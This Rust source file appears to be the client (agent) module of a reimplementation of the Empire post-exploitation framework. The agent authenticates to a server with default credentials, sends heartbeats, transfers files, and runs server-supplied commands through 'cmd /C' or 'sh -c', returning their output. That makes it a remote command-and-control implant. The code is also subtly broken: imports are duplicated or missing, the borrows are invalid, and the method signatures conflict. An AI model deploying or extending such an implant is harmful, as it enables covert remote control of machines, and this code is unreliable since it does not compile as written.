//! Client implementation for the Empire framework.
//!
//! This module contains the client-side implementation of the Empire framework.
//! It is responsible for connecting to the server, executing commands, and
//! handling communication with the server.
//!
//! # Overview
//!
//! The client module provides:
//!
//! - Server communication
//! - Command execution
//! - File transfer
//! - Heartbeat maintenance
//! - Status reporting
//!
//! # Examples
//!
//! ```no_run
//! use empire_rust::client::{Client, ClientConfig};
//! use empire_rust::core::CommandType;
//! use std::net::SocketAddr;
//!
//! #[tokio::main]
//! async fn main() -> Result<(), Box<dyn std::error::Error>> {
//!     // Create client configuration
//!     let config = ClientConfig {
//!         server_address: "127.0.0.1:1337".parse().unwrap(),
//!         username: "agent".to_string(),
//!         password: "password".to_string(),
//!         heartbeat_interval: 10,
//!     };
//!
//!     // Create and connect client
//!     let mut client = Client::new(config);
//!     client.connect().await?;
//!
//!     // Execute a command
//!     let result = client.execute_command(CommandType::Shell {
//!         command: "whoami".to_string(),
//!         args: vec![],
//!     }).await?;
//!
//!     println!("Command result: {}", result.output);
//!     Ok(())
//! }
//! ```

use crate::core::{EmpireClient, EmpireError, Message, MessageHandler, TaskStatus};
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio_util::codec::{Framed, LengthDelimitedCodec};
use log::{error, info};
use std::process::Command;
use std::time::{Duration, Instant};
use tokio::time;
use std::sync::Arc;
use tokio::sync::RwLock;
use uuid;

use crate::core::error::EmpireError;
use crate::core::message::{MessageId};
use crate::core::command::{CommandType, CommandExecutor, CommandResult};
use crate::core::agent::{AgentInfo, AgentInfoBuilder};

/// Client configuration
#[derive(Debug, Clone)]
pub struct ClientConfig {
    /// Server address to connect to
    pub server_address: SocketAddr,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: String,
    /// Heartbeat interval in seconds
    pub heartbeat_interval: u64,
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            server_address: "127.0.0.1:1337".parse().unwrap(),
            username: "agent".to_string(),
            password: "password".to_string(),
            heartbeat_interval: 10,
        }
    }
}

/// Client implementation
pub struct Client {
    /// Client configuration
    config: ClientConfig,
    /// Connection to the server
    connection: Option<Framed<TcpStream, LengthDelimitedCodec>>,
    /// Agent information
    agent_info: Arc<RwLock<Option<AgentInfo>>>,
    /// Whether the client is connected
    connected: Arc<RwLock<bool>>,
}

impl Client {
    /// Create a new client instance
    ///
    /// # Arguments
    ///
    /// * `config` - Client configuration
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    ///
    /// let config = ClientConfig::default();
    /// let client = Client::new(config);
    /// ```
    pub fn new(config: ClientConfig) -> Self {
        Self {
            config,
            connection: None,
            agent_info: Arc::new(RwLock::new(None)),
            connected: Arc::new(RwLock::new(false)),
        }
    }

    /// Connect to the server
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The connection to the server fails
    /// - Authentication fails
    /// - An error occurs while setting up the connection
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    ///
    /// #[tokio::main]
    /// async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ///     let mut client = Client::new(ClientConfig::default());
    ///     client.connect().await?;
    ///     Ok(())
    /// }
    /// ```
    pub async fn connect(&mut self) -> Result<(), EmpireError> {
        // Connect to server
        let stream = TcpStream::connect(self.config.server_address).await
            .map_err(|e| EmpireError::Network(e.into()))?;
        
        let mut framed = Framed::new(stream, LengthDelimitedCodec::new());
        
        // Send authentication request
        framed.send_message(Message::AuthRequest {
            username: self.config.username.clone(),
            password: self.config.password.clone(),
        }).await?;
        
        // Wait for authentication response
        match framed.receive_message().await? {
            Message::AuthResponse { success, message, agent_id } => {
                if !success {
                    return Err(EmpireError::Auth(message));
                }
                
                // Create agent info
                let agent_info = AgentInfoBuilder::new(
                    agent_id.unwrap_or_else(|| Uuid::new_v4().to_string()),
                    self.config.server_address,
                ).build();
                
                // Store agent info
                *self.agent_info.write().await = Some(agent_info);
                
                // Store connection
                self.connection = Some(framed);
                
                // Mark as connected
                *self.connected.write().await = true;
                
                // Start heartbeat task
                let connection = self.connection.as_mut().unwrap();
                let agent_id = self.agent_info.read().await.as_ref().unwrap().id.clone();
                let interval = Duration::from_secs(self.config.heartbeat_interval);
                tokio::spawn(async move {
                    loop {
                        tokio::time::sleep(interval).await;
                        if let Err(e) = connection.send_message(Message::Heartbeat { agent_id: agent_id.clone() }).await {
                            eprintln!("Error sending heartbeat: {}", e);
                            break;
                        }
                    }
                });
                
                Ok(())
            }
            _ => Err(EmpireError::Auth("Unexpected message type".into())),
        }
    }

    /// Disconnect from the server
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    ///
    /// #[tokio::main]
    /// async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ///     let mut client = Client::new(ClientConfig::default());
    ///     client.connect().await?;
    ///     // ... do something ...
    ///     client.disconnect().await?;
    ///     Ok(())
    /// }
    /// ```
    pub async fn disconnect(&mut self) -> Result<(), EmpireError> {
        if let Some(connection) = self.connection.take() {
            drop(connection);
        }
        *self.connected.write().await = false;
        Ok(())
    }

    /// Execute a command
    ///
    /// # Arguments
    ///
    /// * `command` - The command to execute
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The command execution fails
    /// - An error occurs while communicating with the server
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    /// use empire_rust::core::CommandType;
    ///
    /// #[tokio::main]
    /// async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ///     let mut client = Client::new(ClientConfig::default());
    ///     client.connect().await?;
    ///
    ///     let result = client.execute_command(CommandType::Shell {
    ///         command: "whoami".to_string(),
    ///         args: vec![],
    ///     }).await?;
    ///
    ///     println!("Command result: {}", result.output);
    ///     Ok(())
    /// }
    /// ```
    pub async fn execute_command(&mut self, command: CommandType) -> Result<CommandResult, EmpireError> {
        if !*self.connected.read().await {
            return Err(EmpireError::Network("Not connected".into()));
        }
        
        let connection = self.connection.as_mut().unwrap();
        let agent_id = self.agent_info.read().await.as_ref().unwrap().id.clone();
        
        // Create command request
        let message = Message::CommandRequest {
            id: MessageId::new(),
            agent_id,
            command,
        };
        
        // Send command request
        connection.send_message(message).await?;
        
        // Wait for command result
        match connection.receive_message().await? {
            Message::CommandResult { success, output, error } => {
                Ok(CommandResult {
                    success,
                    output,
                    error,
                })
            }
            _ => Err(EmpireError::Command("Unexpected message type".into())),
        }
    }

    /// Upload a file
    ///
    /// # Arguments
    ///
    /// * `source_path` - Path to the file to upload
    /// * `dest_path` - Destination path on the server
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The file cannot be read
    /// - The file transfer fails
    /// - An error occurs while communicating with the server
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    ///
    /// #[tokio::main]
    /// async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ///     let mut client = Client::new(ClientConfig::default());
    ///     client.connect().await?;
    ///
    ///     client.upload_file("local.txt".to_string(), "remote.txt".to_string()).await?;
    ///     Ok(())
    /// }
    /// ```
    pub async fn upload_file(&mut self, source_path: String, dest_path: String) -> Result<(), EmpireError> {
        if !*self.connected.read().await {
            return Err(EmpireError::Network("Not connected".into()));
        }
        
        let connection = self.connection.as_mut().unwrap();
        let agent_id = self.agent_info.read().await.as_ref().unwrap().id.clone();
        
        // Get file size
        let metadata = std::fs::metadata(&source_path)
            .map_err(|e| EmpireError::File(e.to_string()))?;
        let size = metadata.len();
        
        // Create file transfer request
        let message = Message::FileTransferRequest {
            id: MessageId::new(),
            agent_id,
            source_path,
            dest_path,
            size,
        };
        
        // Send file transfer request
        connection.send_message(message).await?;
        
        // Wait for file transfer response
        match connection.receive_message().await? {
            Message::FileTransferResponse { accepted, message } => {
                if !accepted {
                    return Err(EmpireError::File(message));
                }
                Ok(())
            }
            _ => Err(EmpireError::File("Unexpected message type".into())),
        }
    }

    /// Download a file
    ///
    /// # Arguments
    ///
    /// * `source_path` - Path to the file on the server
    /// * `dest_path` - Destination path for the downloaded file
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The file transfer fails
    /// - An error occurs while communicating with the server
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::{Client, ClientConfig};
    ///
    /// #[tokio::main]
    /// async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ///     let mut client = Client::new(ClientConfig::default());
    ///     client.connect().await?;
    ///
    ///     client.download_file("remote.txt".to_string(), "local.txt".to_string()).await?;
    ///     Ok(())
    /// }
    /// ```
    pub async fn download_file(&mut self, source_path: String, dest_path: String) -> Result<(), EmpireError> {
        if !*self.connected.read().await {
            return Err(EmpireError::Network("Not connected".into()));
        }
        
        let connection = self.connection.as_mut().unwrap();
        let agent_id = self.agent_info.read().await.as_ref().unwrap().id.clone();
        
        // Create file transfer request
        let message = Message::FileTransferRequest {
            id: MessageId::new(),
            agent_id,
            source_path,
            dest_path,
            size: 0, // Size will be determined by the server
        };
        
        // Send file transfer request
        connection.send_message(message).await?;
        
        // Wait for file transfer response
        match connection.receive_message().await? {
            Message::FileTransferResponse { accepted, message } => {
                if !accepted {
                    return Err(EmpireError::File(message));
                }
                Ok(())
            }
            _ => Err(EmpireError::File("Unexpected message type".into())),
        }
    }
}

impl CommandExecutor for Client {
    async fn execute(&self, command: CommandType) -> Result<CommandResult, EmpireError> {
        let mut self_ = self.clone();
        self_.execute_command(command).await
    }
}

#[async_trait::async_trait]
impl EmpireClient for Client {
    /// Connects to the Empire server.
    ///
    /// This method establishes a connection to the server specified during
    /// client creation. It must be called before any commands can be executed.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is already connected
    /// - The connection to the server fails
    /// - Any other error occurs during connection
    async fn connect(&self) -> Result<(), EmpireError> {
        if self.connection.is_some() {
            return Err(EmpireError::ConnectionError("Already connected".to_string()));
        }

        let stream = TcpStream::connect(self.config.server_address)
            .await
            .map_err(|e| EmpireError::ConnectionError(e.to_string()))?;

        let mut framed = Framed::new(stream, LengthDelimitedCodec::new());

        // Send authentication request
        framed.send_message(Message::AuthRequest {
            username: self.config.username.clone(),
            password: self.config.password.clone(),
        }).await?;

        // Wait for authentication response
        match framed.receive_message().await? {
            Message::AuthResponse { success, message, agent_id } => {
                if success {
                    if let Some(id) = agent_id {
                        info!("Successfully connected to server");
                        Ok(())
                    } else {
                        Err(EmpireError::AuthenticationError("No agent ID received".to_string()))
                    }
                } else {
                    Err(EmpireError::AuthenticationError(message))
                }
            }
            _ => Err(EmpireError::AuthenticationError("Invalid response type".to_string())),
        }
    }

    /// Disconnects from the Empire server.
    ///
    /// This method gracefully closes the connection to the server and
    /// cleans up any associated resources.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The disconnection fails
    /// - Any other error occurs during disconnection
    async fn disconnect(&self) -> Result<(), EmpireError> {
        // TODO: Implement graceful disconnection
        Ok(())
    }

    /// Executes a command on the connected server.
    ///
    /// This method sends a command to the server and waits for the result.
    /// The command is executed on the server side, and the output is returned.
    ///
    /// # Arguments
    ///
    /// * `command` - The command to execute
    ///
    /// # Returns
    ///
    /// The output of the executed command.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The command execution fails
    /// - Any other error occurs during command execution
    async fn execute_command(&self, command: &str) -> Result<String, EmpireError> {
        if self.connection.is_none() {
            return Err(EmpireError::ConnectionError("Not connected".to_string()));
        }

        // Execute command locally
        let (success, output) = self.execute_local_command(command).await?;

        // Send result to server
        if let Some(connection) = &mut self.connection {
            connection.send_message(Message::CommandResult {
                id: uuid::Uuid::new_v4().to_string(),
                success,
                output,
                error: None,
            }).await?;
        }

        Ok("Command executed".to_string())
    }
}

impl Client {
    /// Executes a command locally and returns the result.
    async fn execute_local_command(&self, command: &str) -> Result<(bool, String), EmpireError> {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", command])
                .output()
                .map_err(|e| EmpireError::CommandError(e.to_string()))?
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(command)
                .output()
                .map_err(|e| EmpireError::CommandError(e.to_string()))?
        };

        let success = output.status.success();
        let output_str = String::from_utf8_lossy(&output.stdout).to_string();
        let error_str = String::from_utf8_lossy(&output.stderr).to_string();

        let result = if !error_str.is_empty() {
            format!("{}\nError: {}", output_str, error_str)
        } else {
            output_str
        };

        Ok((success, result))
    }
} 